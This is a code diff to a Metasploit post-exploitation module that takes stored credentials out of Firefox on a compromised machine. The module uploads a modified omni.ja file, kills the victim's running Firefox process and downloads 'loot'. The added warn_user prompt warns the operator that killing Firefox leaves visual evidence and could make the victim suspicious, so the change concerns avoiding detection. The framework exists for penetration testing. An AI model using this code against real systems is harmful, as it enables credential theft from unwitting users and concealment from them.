@@ -16,6 +16,7 @@ require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 
+	include Rex::Ui::Interactive
 	include Msf::Post::File
 	include Msf::Post::Common
 	include Msf::Auxiliary::Report
@@ -75,11 +76,6 @@ class Metasploit3 < Msf::Post
 		end
 
 		if datastore['DECRYPT']
-			print_line()
-			print_warning("Please be aware of that if your session dies while file renaming,")
-			print_warning("this could leave Firefox in a non working state. This option needs")
-			print_warning("some extra time to accomplish the task.\n")
-
 			omnija = nil
 			org_file = 'omni.ja'
 			new_file = Rex::Text::rand_text_alpha(5 + rand(3)) + ".ja"
@@ -116,6 +112,7 @@ class Metasploit3 < Msf::Post
 				return
 			end
 			print_status("Uploading #{new_file} to #{@paths['ff']}")
+			print_warning("This takes some extra time") if @platform =~ /unix|osx/
 			if not upload_file(@paths['ff']+new_file, tmp)
 				print_error("Could not upload #{new_file}")
 				return
@@ -477,10 +474,16 @@ class Metasploit3 < Msf::Post
 		if session.type == "meterpreter"
 			session.sys.process.each_process do |p|
 				if p['name'] =~ /firefox\.exe/
-					print_status("Found running Firefox process, attempting to kill.")
-					if not session.sys.process.kill(p['pid'])
-						print_error("Could not kill Firefox process")
-						return false
+					print_status("Found running Firefox process")
+					continue = warn_user()
+					if continue
+									if not session.sys.process.kill(p['pid'])
+										print_error("Could not kill Firefox process")
+										return false
+									end
+					else
+									file_rm(new_file)
+									return false
 					end
 				end
 			end
@@ -488,11 +491,17 @@ class Metasploit3 < Msf::Post
 		elsif session.type != "meterpreter"
 			p = cmd_exec("ps", "cax | grep firefox")
 			if p =~ /firefox/
-				print_status("Found running Firefox process, attempting to kill.")
-				term = cmd_exec("killall", "firefox && echo true")
-				if not term =~ /true/
-					print_error("Could not kill Firefox process")
-					return false
+				print_status("Found running Firefox process")
+				continue = warn_user()
+				if continue
+								term = cmd_exec("killall", "firefox && echo true")
+								if not term =~ /true/
+									print_error("Could not kill Firefox process")
+									return false
+								end
+				else
+								file_rm(new_file)
+								return false
 				end
 			end
 		end
@@ -524,6 +533,13 @@ class Metasploit3 < Msf::Post
 
 		return true
 
+	end
+
+	def warn_user()
+					print_warning("In order to proceed, the running Firefox process must be killed.")
+					print_warning("Keep in mind that this leaves visual evidence on the victim machine and")
+					print_warning("if the user is paying attention, this could make him/her suspicious.")
+					return prompt_yesno("Do you want to continue?")
 	end
 
 	def download_loot(paths)
